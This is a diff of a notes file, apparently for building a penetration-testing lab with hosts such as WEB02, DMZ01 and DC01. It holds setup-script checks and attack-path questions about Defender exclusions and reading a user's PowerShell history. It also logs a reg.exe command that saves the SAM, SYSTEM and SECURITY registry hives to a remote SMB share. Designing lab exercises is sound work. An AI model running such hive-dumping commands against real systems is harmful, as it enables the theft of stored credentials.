@@ -3,31 +3,11 @@ Ensure you set a defender exclusion before you unzip the project on your PC
 
 ----------------------------------
 Scripts:
-Make sure Windows Security is initialized before running the script
 
-Confirm these scripts still work after the edits:
-
-DC01 script - 2 prompts at beginning
-
-DEV01 script - after rebooting, or after step 7 is complete, run the script and confirm the checkpoint works, (The script doesn't restart from the beginning, it starts from the manual step.)
+Confirm DEV01 script still works after the edits
+- After rebooting, or after step 7 is complete, run the script and confirm the checkpoint works, (The script doesn't restart from the beginning, it starts from the manual step.)
 Confirm the wordpress database is accessible. (If Apache/MySQL can't be started, reboot.)
 
-------------------------------------------------
-
-Questions:
-
-
-WEB02: Before getting NT Authority, are we able to check the MP preference to see which directories have an exclusion? Are we able to set an exclusion?
-
-
-DMZ01: Before getting NT Authority, are we able to read Chris' PowerShell history file?
-
-
-
-
-
-----------------------------
-Potential Edits:
 
 WEB02 execution:
 PS C:\Windows\System32> reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
@@ -38,6 +18,21 @@ ERROR: A required privilege is not held by the client.
 Why is a required privilege not held? Was this a fluke? Or does WEB02 need to be rebooted and re-backed-up?
 
 
+
+---------------------------------------------------------------------------
+Questions:
+
+
+WEB02: Before getting NT Authority, are we able to check the MP preference to see which directories have an exclusion? Are we able to set an exclusion?
+
+
+DMZ01: Before getting NT Authority, are we able to read Chris' PowerShell history file?
+
+
+
+----------------------------------------------------
+Run these setup scripts, just to confirm:
+DC01 script - 2 prompts at beginning
 
 MAIL01 script:
 Add the instruction to open server manager.
